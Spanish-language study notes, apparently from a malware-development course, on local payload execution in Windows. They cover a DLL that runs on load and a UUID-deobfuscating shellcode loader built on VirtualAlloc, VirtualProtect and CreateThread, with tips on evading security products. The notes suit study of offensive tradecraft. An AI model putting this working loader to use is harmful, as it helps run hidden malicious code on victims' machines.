# Local Payload Execution - DLL

- En este apunte se documentan las técnicas de ejecución de payloads locales en Windows utilizando DLLs.

### Crear una DLL

- Para crear una DLL en C podemos armar un proyecto en Visual Studio y utilizar el siguiente código de ejemplo:

Esta demostración utilizará un cuadro de mensaje que aparece cuando la DLL se carga exitosamente. Crear un cuadro de mensaje se puede hacer fácilmente con la API de Windows MessageBox. El fragmento de código a continuación ejecutará MsgBoxPayload cada vez que la DLL sea cargada en un proceso. Nota que los encabezados precompilados fueron removidos de la configuración C/C++ del proyecto como se muestra en el módulo introductorio de Biblioteca de Enlace Dinámico.


```c
#include <Windows.h>
#include <stdio.h>

VOID MsgBoxPayload() {
    MessageBoxA(NULL, "Hacking", "Wow !", MB_OK | MB_ICONINFORMATION);
}


BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

----


### Compilar la DLL

- Para compilar la DLL, podemos utilizar el comando `cl` de Visual Studio:

```powershell
cl /LD /Fe:payload.dll payload.c user32.lib
```


## Inyección local de la DLL

Recordemos que la **WinAPI** `LoadLibrary` se utiliza para cargar una DLL. Esta función toma la ruta de una DLL en disco y la carga en el espacio de direcciones del proceso que la llama, que en nuestro caso será el proceso actual. Cargar la DLL ejecutará su punto de entrada y, por lo tanto, ejecutará la función `MsgBoxPayload`, haciendo que aparezca el cuadro de mensaje. Aunque el concepto es simple, será útil en módulos posteriores para entender técnicas más complejas.

El código a continuación tomará el nombre de la DLL como argumento de línea de comandos, la cargará usando **LoadLibraryA**, y realizará algunas verificaciones de errores para asegurar que la DLL se cargó exitosamente.

```c
#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

	if (argc < 2){
		printf("[!] Missing Argument; Dll Payload To Run \n");
		return -1;
	}

	printf("[i] Injecting \"%s\" To The Local Process Of Pid: %d \n", argv[1], GetCurrentProcessId());
	
	
	printf("[+] Loading Dll... ");
	if (LoadLibraryA(argv[1]) == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE ! \n");

	
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
``` 

----

# Local Payload Execution - Shellcode

## Windows API necesarios
- **[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)**: Asigna memoria en el proceso actual que será utilizada para almacenar el payload/shellcode.
- **[VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)**: Modifica los permisos de protección de la memoria asignada para hacerla ejecutable y poder ejecutar el payload.
- **[CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)**: Crea un nuevo hilo de ejecución que ejecutará el payload almacenado en la memoria asignada.

### Allocating memory

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
  [in]           DWORD  flAllocationType,   // The type of memory allocation
  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated
);
```

El tipo de asignación de memoria se especifica como `MEM_RESERVE | MEM_COMMIT`, que reserva un rango de páginas en el espacio de direcciones virtuales del proceso que realiza la llamada y confirma la memoria física para esas páginas reservadas. Las flags combinadas se discuten por separado a continuación:

- **`MEM_RESERVE`**: Se utiliza para reservar un rango de páginas sin confirmar realmente la memoria física.
- **`MEM_COMMIT`**: Se utiliza para confirmar un rango de páginas en el espacio de direcciones virtuales del proceso.

El último parámetro de `VirtualAlloc` establece los permisos en la región de memoria. La forma más fácil sería establecer la protección de memoria a `PAGE_EXECUTE_READWRITE`, pero esto generalmente es un indicador de actividad maliciosa para muchas soluciones de seguridad. Por lo tanto, la protección de memoria se establece a `PAGE_READWRITE` ya que en este punto solo se requiere escribir el payload, pero no ejecutarlo. Finalmente, `VirtualAlloc` retornará la dirección base de la memoria asignada.



### Writing Payload to memory

A continuación, los bytes del payload desobfuscado se copian en la región de memoria recién asignada en `pShellcodeAddress` y luego se limpia `pDeobfuscatedPayload` sobrescribiéndolo con 0s. `pDeobfuscatedPayload` es la dirección base de un heap asignado por la función `UuidDeobfuscation` que retorna los bytes del shellcode en bruto. Ha sido sobrescrito con ceros ya que ya no se requiere y por lo tanto esto reducirá la posibilidad de que las soluciones de seguridad encuentren el payload en memoria.

## Modificando la protección de memoria

Antes de que el payload sea ejecutado, la protección de memoria tiene que ser modificada desde solo `lectura/escritura` está permitido. VirtualProtect se utiliza para modificar las protecciones de memoria y para que el payload se ejecute necesitará ya sea `PAGE_EXECUTE_READ` o `PAGE_EXECUTE_READWRITE`.

**The VirtualProtect WinAPI function looks like the following based on its documentation**

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
         // The base address of the memory region whose access protection is to be changed
  [in]  SIZE_T dwSize,
            // The size of the region whose access protection attributes are to be changed, in bytes
  [in]  DWORD  flNewProtect,
      // The new memory protection option
  [out] PDWORD lpflOldProtect
     // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'
);
```

## Payload Execution Via CreateThread

Finalmente, el payload es ejecutado creando un nuevo hilo usando la función de la API de Windows `CreateThread` y pasando `pShellcodeAddress` que es la dirección del shellcode.

La función `CreateThread` de la WinAPI se ve de la siguiente manera basándose en su documentación

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
      // Set to NULL - optional
  [in]            SIZE_T                  dwStackSize,
             // Set to 0 - default
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
          // Pointer to a function to be executed by the thread, in our case its the base address of the payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
             // Pointer to a variable to be passed to the function executed (set to NULL - optional)
  [in]            DWORD                   dwCreationFlags,
         // Set to 0 - default
  [out, optional] LPDWORD                 lpThreadId
               // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   
);
``` 

## Payload Execution via Function Pointer

Alternativamente, hay una forma más simple de ejecutar el shellcode sin usar la API de Windows `CreateThread`. En el ejemplo a continuación, el shellcode se **convierte a un puntero de función VOID** y el shellcode se ejecuta como un puntero de función. El código esencialmente salta a la dirección `pShellcodeAddress`.

- `(*(VOID(*)()) pShellcodeAddress)();`
- Es el equivalente a correr el siguiente código:

```c
    typedef VOID (WINAPI* fnShellcodefunc)();
           // Defined before the main function
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();
``` 

## CreateThread vs Function Pointer

Aunque es posible ejecutar shellcode usando el function pointer method, generalmente **no se recomienda**.
 El shellcode generado por Msfvenom termina el hilo que lo llama después de que termina de ejecutarse. Si el shellcode fue ejecutado usando el function pointer method, entonces el hilo que lo llama será el hilo principal y por lo tanto todo el proceso saldrá después de que el shellcode termine de ejecutarse.

Ejecutar el shellcode en un nuevo hilo previene este problema porque si el shellcode termina de ejecutarse, el nuevo hilo de trabajo será terminado en lugar del hilo principal, evitando que todo el proceso termine.


## Waiting for the thread execution

Ejecutar el shellcode usando un nuevo hilo sin un breve retraso aumenta la probabilidad de que el hilo principal termine su ejecución antes de que el hilo de trabajo que ejecuta el shellcode haya completado su ejecución, lo que lleva a que el shellcode no se ejecute correctamente. Este escenario se ilustra en el fragmento de código a continuación.

```c
int main(){
    
    // ...
    
    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode execution
    return 0; // The main thread is done executing before the thread running the shellcode
}
```

In the provided implementation, getchar() is used to pause the execution until the user provides input. In real implementations, a different approach should be used which utilizes the [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) WinAPI to wait for a specified time until the thread executes.

The snippet below uses [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) to wait for the newly created thread to finish executing for 2000 milliseconds before executing the remaining code.

---

#### WaitForSingleObject

Espera hasta que el objeto especificado esté en estado señalizado o el intervalo de tiempo de espera transcurra.

Para entrar en un estado de espera alertable, usa la función WaitForSingleObjectEx. Para esperar múltiples objetos, usa WaitForMultipleObjects.


```c
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
);
``` 

---

#### Siguiendo...

```c

HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// Remaining code
``` 


- En el ejemplo a continuación, WaitForSingleObject esperará indefinidamente a que el nuevo hilo termine de ejecutarse.

```c
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINTE);
```

---


## Main function

La función principal utiliza `UuidDeobfuscation` para desobfuscar el payload, luego asigna memoria, copia el shellcode a la región de memoria y lo ejecuta.

```c
int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");

    // if not
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    // alocamos memoria
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    //if not
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    // tambien podemos usar RtlMoveMemory de ntdll.dll
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
``` 

---

## Deallocating Memory

[VirtualFree](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree) es una WinAPI que se utiliza para desasignar memoria previamente asignada. Esta función solo debe ser llamada después de que el payload haya terminado completamente su ejecución, de lo contrario podría liberar el contenido del payload y hacer que el proceso se bloquee.

```c
BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
``` 
`VirtualFree` toma la dirección base de la memoria asignada que se va a liberar (`lpAddress`), el tamaño de la memoria a liberar (`dwSize`) y el tipo de operación de liberación (`dwFreeType`) que puede ser una de las siguientes flags:

- **`MEM_DECOMMIT`** - La llamada `VirtualFree` liberará la memoria física sin liberar el espacio de direcciones virtuales que está vinculado a ella. Como resultado, el espacio de direcciones virtuales aún puede ser utilizado para asignar memoria en el futuro, pero las páginas vinculadas a él ya no están respaldadas por memoria física.

- **`MEM_RELEASE`** - Tanto el espacio de direcciones virtuales como la memoria física asociada con la memoria virtual asignada son liberados. Nota que según la documentación de Microsoft, cuando se usa esta flag el parámetro `dwSize` debe ser 0.

